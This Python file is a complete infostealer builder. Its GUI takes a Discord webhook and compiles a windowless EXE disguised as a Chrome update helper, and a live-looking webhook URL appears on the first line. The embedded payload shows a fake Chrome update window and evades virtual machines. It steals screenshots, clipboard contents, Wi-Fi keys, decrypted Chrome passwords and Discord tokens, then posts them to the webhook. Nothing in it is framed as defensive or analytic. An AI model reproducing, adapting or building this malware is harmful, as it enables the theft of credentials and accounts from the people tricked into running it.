https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO


import os
import sys
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk
import re
import shutil
import tempfile
import secrets
import textwrap

# =================== GUI FOR WEBHOOK ===================
def get_webhook():
    root = tk.Tk()
    root.title("Stealer Builder v3 - Final Fix")
    root.geometry("520x220")
    root.resizable(False, False)

    tk.Label(root, text="Discord Webhook URL:", font=("Arial", 11)).pack(pady=15)
    webhook_entry = tk.Entry(root, width=70, font=("Arial", 10))
    webhook_entry.pack(pady=5)

    progress = ttk.Progressbar(root, mode="indeterminate")

    def build():
        webhook = webhook_entry.get().strip()
        if not webhook or not re.match(r"https://discord(app)?\.com/api/webhooks/\d+/.+", webhook):
            messagebox.showerror("Invalid", "Wrong webhook format, genius.\nNeeds to look like: https://discord.com/api/webhooks/1234567890/abcdefg")
            return

        progress.pack(pady=15)
        progress.start(10)
        root.update_idletasks()

        try:
            generate_malware(webhook)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Done", "Build finished!\nEXE: stealer.exe in current folder.\nGo test that shit in a VM.")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Crashed", f"Fuck: {str(e)}\nCheck console for full traceback.")
        finally:
            root.destroy()

    tk.Button(root, text="BUILD EXE", command=build, bg="#0f0", fg="black", font=("Arial", 12, "bold")).pack(pady=20)
    root.mainloop()

# =================== STEALER CODE (fixed regex) ===================
stealer_code = textwrap.dedent('''
import os, sys, time, random, ctypes, socket, subprocess, re, json, secrets, base64, io, requests, threading
import tkinter as tk
from tkinter import ttk
from pathlib import Path
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from PIL import ImageGrab
import win32crypt
import shutil

# Fake Chrome GUI to distract
def fake_gui():
    time.sleep(2)
    root = tk.Tk()
    root.title("Google Chrome Update")
    root.geometry("430x260")
    root.resizable(False, False)
    root.configure(bg="#f0f0f0")
    tk.Label(root, text="Chrome", font=("Segoe UI", 20, "bold"), fg="#4285F4", bg="#f0f0f0").pack(pady=15)
    tk.Label(root, text="Syncing your data across devices...", bg="#f0f0f0").pack(pady=5)
    pb = ttk.Progressbar(root, mode="indeterminate", length=350)
    pb.pack(pady=20)
    pb.start(15)
    tk.Label(root, text="Please wait - do not close this window.", fg="gray", bg="#f0f0f0").pack(pady=10)
    root.attributes("-topmost", True)
    root.mainloop()

threading.Thread(target=fake_gui, daemon=True).start()

def is_vm():
    bad = ["vboxservice.exe", "vmtoolsd.exe", "vgauthservice.exe"]
    tasklist = subprocess.getoutput("tasklist")
    for p in bad:
        if p.lower() in tasklist.lower():
            return True
    try:
        class MEM(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
        mem = MEM()
        mem.dwLength = ctypes.sizeof(mem)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
        if mem.ullTotalPhys < 4 * 1024**3:
            return True
    except: pass
    return False

def grab_screenshot():
    try:
        img = ImageGrab.grab(all_screens=True)
        buf = io.BytesIO()
        img.save(buf, "PNG")
        return base64.b64encode(buf.getvalue()).decode()
    except: return ""

def grab_clipboard():
    try:
        return subprocess.check_output("powershell -Command Get-Clipboard", text=True, shell=True).strip()
    except: return ""

def grab_wifi():
    wifi = []
    try:
        output = subprocess.check_output("netsh wlan show profiles", text=True)
        profiles = re.findall(r"All User Profile\\s+:\\s+(.*)", output)
        for profile in profiles:
            profile = profile.strip()
            out = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', text=True)
            key = re.search(r"Key Content\\s+:\\s+(.*)", out)
            if key:
                wifi.append({"ssid": profile, "password": key.group(1).strip()})
    except: pass
    return wifi

def grab_chrome():
    creds = []
    appdata = os.getenv("LOCALAPPDATA")
    if not appdata: return creds
    ls = Path(appdata) / "Google/Chrome/User Data/Local State"
    db = Path(appdata) / "Google/Chrome/User Data/Default/Login Data"
    if not ls.exists() or not db.exists(): return creds
    try:
        import json, sqlite3
        master_key = win32crypt.CryptUnprotectData(base64.b64decode(json.load(open(ls))["os_crypt"]["encrypted_key"])[5:])[1]
        tmp = Path(os.getenv("TEMP")) / f"db{secrets.token_hex(5)}.db"
        shutil.copy(db, tmp)
        conn = sqlite3.connect(str(tmp))
        for row in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
            url, user, epw = row
            if not epw[:3] in (b"v10", b"v11"): continue
            nonce, ct, tag = epw[3:15], epw[15:-16], epw[-16:]
            pw = AESGCM(master_key).decrypt(nonce, ct + tag, None).decode(errors="ignore")
            creds.append({"url": url, "user": user, "pass": pw})
        conn.close()
        os.remove(tmp)
    except: pass
    return creds

def grab_discord():
    tokens = set()
    bases = ["discord", "discordcanary", "discordptb"]
    for base in bases:
        path = Path(os.getenv("APPDATA")) / base / "Local Storage/leveldb"
        if not path.exists(): continue
        for file in path.glob("*.ldb") + path.glob("*.log"):
            try:
                data = open(file, "r", errors="ignore").read()
                # FIXED: Proper escaping for \w
                tokens.update(re.findall(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27,}", data))
            except: pass
    return list(tokens)

def exfil(data, hook):
    key = secrets.token_bytes(32)
    nonce = secrets.token_bytes(12)
    ct = AESGCM(key).encrypt(nonce, json.dumps(data).encode(), None)
    payload = base64.b64encode(nonce + ct).decode()
    try:
        requests.post(hook, json={"content": payload}, headers={"X-Key": base64.b64encode(key).decode()}, timeout=15)
    except: pass

if is_vm():
    time.sleep(1800)

payload = {
    "hostname": socket.gethostname(),
    "screenshot_b64": grab_screenshot(),
    "clipboard": grab_clipboard(),
    "wifi": grab_wifi(),
    "chrome_passwords": grab_chrome(),
    "discord_tokens": grab_discord(),
    "timestamp": datetime.utcnow().isoformat()
}

exfil(payload, "{WEBHOOK_PLACEHOLDER}")

while True:
    time.sleep(86400)
''')

# =================== BUILD FUNCTION (fixed temp path) ===================
def generate_malware(webhook):
    # Force clean temp dir in current working directory - no spaces
    temp_dir = tempfile.mkdtemp(prefix="builder_", dir=os.getcwd())
    script_path = os.path.join(temp_dir, "main.py")
    
    final_code = stealer_code.replace("{WEBHOOK_PLACEHOLDER}", webhook)
    
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(final_code)
    
    build_cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--name", "ChromeUpdateHelper",
        script_path
    ]
    
    print(f"Building in: {temp_dir}")
    print(f"Command: {' '.join(build_cmd)}")
    
    result = subprocess.run(build_cmd, cwd=temp_dir, capture_output=True, text=True)
    
    if result.returncode != 0:
        raise Exception(f"PyInstaller error:\n{result.stderr}\n\nSTDOUT:\n{result.stdout}")
    
    dist_exe = os.path.join(temp_dir, "dist", "ChromeUpdateHelper.exe")
    final_exe = os.path.join(os.getcwd(), "stealer.exe")
    shutil.copyfile(dist_exe, final_exe)
    
    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"Success - EXE dropped: {final_exe}")

if __name__ == "__main__":
    get_webhook()
